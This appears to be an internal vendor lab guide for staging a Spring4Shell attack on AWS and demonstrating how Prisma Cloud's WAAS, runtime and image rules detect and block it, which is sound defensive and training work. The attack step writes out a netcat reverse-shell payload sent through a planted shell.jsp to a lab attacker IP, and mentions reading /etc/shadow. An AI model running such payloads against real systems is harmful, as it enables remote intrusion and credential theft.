# Lab for simulating SpringShell (Spring4Shell) Attack on AWS and Protecting with Prisma Cloud
    
Written by John Chavanne   
    
These set of instructions are written to incorporate several components.  Namely:
- Discuss how Prisma Cloud offers both Agent & Agentless, the benfits of each, but most importantly the need for Agents for all critical workloads.
- The recent Critical Vulnerabilities such as Log4Shell & SpringShell, their risks, accelerating rate of vulnerabilities, and how attackers often have significant amount of time on average to exploit these types of vulnerabilities before customers can fix them.
- Why Runtime Defense & Deploying a Container Defender
- Why WAAS & enabling it
- Why shifting left with Prisma Cloud and setting up security gates through the entire application lifecycle process adds additional layers of defense to block vulnerable and non-compliant images from being built and deployed.

## Prerequisites 
- AWS account with permissions to create EC2 instances, VPCs, security groups, etc. to setup the lab environment
- Access to Prisma Cloud SaaS tenant

## Things to Know
Some important points to understand with the current lab scripts and setup.

**This current set of instructions refers to documentation and automation scripts currently held internally to Palo Alto Networks. Because of this, any non-PANW employee may need to build some of the setup on their own until we can create a public facing setup.  With that said, the setup is fairly basic, only requiring 2 EC2 instances, the vulnerable image to build a container, and the exploit script.  More details to come.**

1. It will deploy 2 host machines (attacker and vulnerable machine) and a container running on the vulnerable machine.
2. When running the attack, different events and incidents will occur on both the vulnerable host and the container.
3. Because of this, it helps to understand the layers of the attack and commands that you will run.
4. It also helps to understand what rules you are setting and the particular parts of the attack that each rule alerts/prevents.
5. Make sure you run this lab at least a couple times to understand these things so you are prepared to explain/answer questions when demoing.
6. Feel free to also make any suggestions/enhancements to this lab!
    
Do all of the following steps in advance of the demo

## Lab Setup
Refer to Internal Spring4Shell Docs at this time until can rewrite for sharing. 

- Complete all initial setup steps and Steps 1 & 2 of the 'Perform Attack Steps' and before runing the exploit script in Step 3.
    - Run `bash start-lab.sh` script and a select choice 3 "Spring4Shell Lab" and provide Access
Key ID, and Secret Access Key
- Copy all the commands in the following steps in a notepad and pre-enter the Target-IP address.  This will save time in demo.
- Login to Prisma Cloud and Initiate both:
    - (Optional, noting that we only scan Hosts at this time, so will only get results for the Host and see error for container) Agentless Scan - Monitor > Vulnerabilities > Host > Scan Agentless
    - (Optional) Cloud Discovery on AWS - Monitor > Compliance > Cloud Discovery > Click on your account/EC2 service line.  Verify the new instances are shown here and as not defended.

## Install Defender
1. SSH to your spring4shell instance (not Kali), inserting your instance's IP address
```
ssh -i temp-lab/spring4shell_cloud_breach/terraform/panw ubuntu@<spring4shell-ubuntu-lab IP>
```
2. Refer to [Install Defenders](./Install_Defenders_in_Public_Cloud.md) instructions and
    - install twistci
    - export variables
    - install a container defender
3. Verify in the Console that it recognizes a Defender is now installed on device

## Setup WAAS Rule
1. Go to Prisma Console (Enterprise Edition ONLY) - **Compute > Defend > WAAS > Host**
2. Click **+ Add Rule**
3. Rule Name: **Spring4Shell Defense**
4. Then click in the **'Scope'** field
5. Make sure there is a Check box next to **All**.  Alternatively you can create a rule specific for this vulnerable Host.
    - Step 5a: (OPTIONAL) If writing a specifc rule (not All) and there are no Collections for your Host, click **'Add Collection'**, type in a name, Click in the **Host** field, select your vulnerable Host instance, and click **'Save'**
    - Step 5b: Ensure you have your desired collection box checked and click **'Select collections'**
6. Click **‘Add New App’**
7. On the next pop-up click the **‘+ Add Endpoint’**
8. Enter **80** for App port (internal port) then hit **‘Create’**
9. Click the **‘App Firewall'** tab and confirm all settings are set to **Alert**, (with exception to Detect Information Leakage which should be set to Disable by default). 
10. Click **‘Save’**

NOTE: For performing the demo, suggest to **'Disable'** the alert temporarily, under **Actions** and clicking the 3 dots. and Allow Prisma Cloud to Discover the Vulnerable Host and Container in the Radars view after installing the defender during the demo and that it shows that it is an Unprotected Web App.**. 

## Setup Runtime Rule(s)
1. Go to **Compute > Defend > Runtime > Container Policy**
2. Click **+ Add rule** 
3. Enter a rule name such as: **Block reverse shell**
4. Click in the **Scope** field
5. Create a rule specific for this vulnerable Container app.
    - Step 5a: Select your container selection (if already created) or Click **'Add Collection'**, type in a name, Click in the **Image** field, type in `vuln_app_app`, select it and click **'Save'**
    - Step 5b: Ensure you have your desired collection box checked and click **'Select collections'**
6. Click **Processes** tab.
7. Under **Denied & Fallback**, scroll near bottom and under **Processes** enter `/bin/bash`
8. Change **Effect** from Alert to **Prevent**
9. Click **Save**
10. For performing the demo, **'Disable'** the alert temporarily, under **Actions** and clicking the 3 dots. 
11. Additional create a default rule repeating all the above steps, however give a different name such as 'Default - alert on suspicious behavior` and leave all settings as is and Save.  This rule you can leave enabled and will show alerts when you run first part of demo.

## Setup Vulnerability Rule
1. Go to **Compute > Defend > Vulnerabilities > Images > Deployed** and Click **+ Add Rule**
2. Enter a name such as: Block Containers with Critical Vulnerabilities
3. In the **Block threshold** section, change to Block on **Critical**
4. Then click in the **'Scope'** field
5. Create a rule specific for this vulnerable Container app.
    - Step 5a: Select your container selection (if already created) or Click **'Add Collection'**, type in a name, Click in the **Image** field, type in `vuln_app_app`, select it and click **'Save'**
    - Step 5b: Ensure you have your desired collection box checked and click **'Select collections'**
6. For performing the demo, **'Disable'** the alert temporarily, under **Actions** and clicking the 3 dots.

## Setup Compliance Rule
1. TODO - Add Detail here.

## Setup Trusted Images Rule - OPTIONAL & Requires integration with a registry:
Before creating a rule, ensure you have setup an ECR repo and registry scanning with Prisma Cloud.  Follow these Docs:
- [Getting started with Amazon ECR](https://docs.aws.amazon.com/AmazonECR/latest/userguide/getting-started-console.html)
- [Configure registry scans](https://docs.paloaltonetworks.com/prisma/prisma-cloud/prisma-cloud-admin-compute/vulnerability_management/registry_scanning)
- [Scan Amazon EC2 Container Registry (ECR)](https://docs.paloaltonetworks.com/prisma/prisma-cloud/prisma-cloud-admin-compute/vulnerability_management/registry_scanning0/scan_ecr)
- [Setup Credentials store](https://docs.paloaltonetworks.com/prisma/prisma-cloud/prisma-cloud-admin-compute/authentication/credentials_store)
    
Assuming you have successfuly setup an ECR repo and scanning, create the following:
1. Go to **Compute > Defend > Compliance > Trusted Images > Trust Groups**
2. Click **+ Add group**
3. Create new trust group - see [Trusted images docs](https://docs.paloaltonetworks.com/prisma/prisma-cloud/prisma-cloud-admin-compute/compliance/trusted_images)
4. Go to the **Policy** tab under Trusted Images and if not already, click switch next to **Trusted images rules** to enable.
5. Click **+ Add rule** and again refer to docs to create a new rule.
6. For performing the demo, **'Disable'** the rule temporarily, under **Actions** and clicking the 3 dots. 
7. Additionaly setup docker/AWS credentails on the spring4shell instance in order to pull images from your registry. (TODO - add detail here)

## Pre-Demo verification Steps
1. Verify on **Compute > Radars > Container** screen, the new vulnerable container has completed learning mode and shows the red firewall with a line through it, indicating it is an unprotected Web App
    - This make take 10-20 mins after installing the Defender to show up.
2. Verify in **Compute > Monitor > Compliance > Cloud Discovery > Your Credentail/EC2 Service Line** shows the expected number of devices Defended.  The Kali Attacker machine should not be.  Ensure to state this in the demo if you show this.

## Begin Demo
1. If you left the WAAS Rule(s) Disabled and you pre-checked the Unprotected Web App icon is present, then first Navigate to **Compute > Radars > Containers** and show the red firewall with a line through it. Click the **vuln_app_app** and highlight that it was recognized as a **Unprotected Web App**
2. If the red firewall icon is not present (Prisma Cloud can take up to 30 mins. to recognize this), SKIP over highlighting this.
3. Show vulnerabilities and Compliance issue.
4. Either from the Container screen itself, Click the **Defend** button OR or through **Defend > WAAS**, go to the **Host** tab and Enable the WAAS rule.  Make sure you enable the **Host WAAS Rule, not a Container one**.
5. Show that the WAAS rule is only in Alert mode for now.
6. Run the attack 
    - `bash /tmp/exploit.sh`
    - Remotely Install packages, install netcat with curl commands
    - Open 2nd terminal and run `nc -lvnp 9001`
    - Send the payload to gain a reverse shell 
    ```
    curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2010.0.2.160%209001
    ```
    - Run some commands in the reverse shell terminal.
7. Discuss what the attacker was able to do.
    - i.e. Remote Code Execution, run commands like `cat /etc/shadow` to gain passwords.
    - Gain a reverse shell and run commands directly

### Show the events
1. Navigate to **Compute > Monitor > Events > WAAS for hosts** and scroll to bottom.  Should see events for these attacks.  Discuss both.
    - Code Injection
    - Local File Inclusion
2. Navigate to **Compute > Radars > Hosts** Locate the new Host and should show red hue around.  Click and show that it has been involved in an Incident.
3. Navigate to **Compute > Monitor > Runtime > Incident Explorer** Should see incidents for these attacks.
    - Reverse Shell
    - Lateral Movement
4. Discuss both, including viewing Forensic Data, showing the command in the Events

### Turn on Defenses in Prisma Cloud
1. Block Reverse Shell 
    - Exit the reverse shell in your terminal with **Control + C**
    - In Prisma Cloud, Navigate to **Compute > Defend > Runtime > Container Policy** and for your new rule you created prior to demo (i.e. 'Block reverse shell), Click the 3 dots to the far right on the rule and **Enable**.
    - Rerun `nc -lvnp 9001` command from terminal
    - Reexecute payload command from other teminal.  
    - This time, you should see that the reverse shell connection cannot be established.  Navigate to Prisma Cloud to show event under **Monitor > Events > Container audits**.
2. Prevent the Code Injection & Local File Inclusion Attacks
    - Enable the Host WAAS Rule you created in prep
    - Re-run the bash exploit script `bash /tmp/exploit.sh` and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script.
    - Show the Events under **Compute > Monitor > Events > WAAS for Hosts**.  If there are mutiple counts, Zoom in on the latest.
3. OPTIONAL - Prevent Container with Critical Vulnerabilities from even running
    - Navigate to **Compute > Defend > Vulnerabilities > Images > Deployed** and enable your new rule you created prior to demo with a Click on the 3 dots to the far right under Actions and **Enable**.
    - In the spring4shell-ubuntu terminal, kill the current container
        - Get the container ID of **vuln_app_app** `docker ps`
        - `docker kill <ID>`
    - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
    - You should see a message that Image is blocked by your policy.
 4. OPTIONAL - Prevent Container from running that fails Compliance Rule
    - Enable policy
 5. OPTIONAL - Prevent Running Container not from Trusted Registry/Repo/Image
    - Navigate to **Compute > Defend > Compliance > Trusted Images**
    - Enable your policy
    - Try creating a new container `docker run --rm -p 80:8080 vuln_app_app`
    - You should see a message that Image is blocked by your policy.

## Demo Summary - Highlight the Power of Prisma Cloud
- Defense in Depth
- Agentless may be fine for non-public facing workloads, however Agents are a must for any applications you care to protect.
- We learned we can not only protect about known vulnerabilities, but also Prisma Cloud protects against malicious and anomolous behavior and processes such as reverse shells and recognized laternal movements as only a few examples we demonstrated today.
- Given the statistics (referring to the NIST NVD slide stats - TODO share this slide info here), on avg. attackers have approx. 83.3 days (60.3 days average to patch after CVE is public + an exploit on average is published 23 days before the CVE is published) to exploit a vulnerability in advance of companies being able to actually patch against a particular threat.
    - Ref: [25+ cyber security vulnerability statistics and facts of 2021](https://www.comparitech.com/blog/information-security/cybersecurity-vulnerability-statistics/)


## Additional Bonus - Integrate Demo with Shift Left Capabilities
1. If you prepared to pull images from a registry, run a `docker pull` command to pull down an image from a trusted registry
2. Run the container `docker run --rm -p 80:8080 <registry/image>`
3. Highlight this container is considered safe to run as compared to the others.
4. Then navigate to your registry, repos and show the scan results and how Prisma Cloud further extends it's capabilities into the developers areas and how we can setup these mutiple security gates to further ensure only compliant and safe images are allowed to be run through CI/CD pipelines and DevOps workflows and deployed to cloud (both on-prem and public) environments.

## Cleanup
1. Disable your new Host WAAS rule
2. Disable your new Runtime Container Policy rule
3. Disable other Rules you used (i.e. Vulnerabilities, Compliance - Containers and images, Compliance - Trusted Images)
4. Exit SSH sessions and run the `bash destroy-lab.sh` script


## Other Notes
There are some additional improvements. Such as:
- Editing the output messages in the exploit script to not echo if being blocked.  As of now it prints the message regardless.
- Fixing exploit script to allow mutiple exploit attempts.  It seems to cause some errors when run mutiple times.  
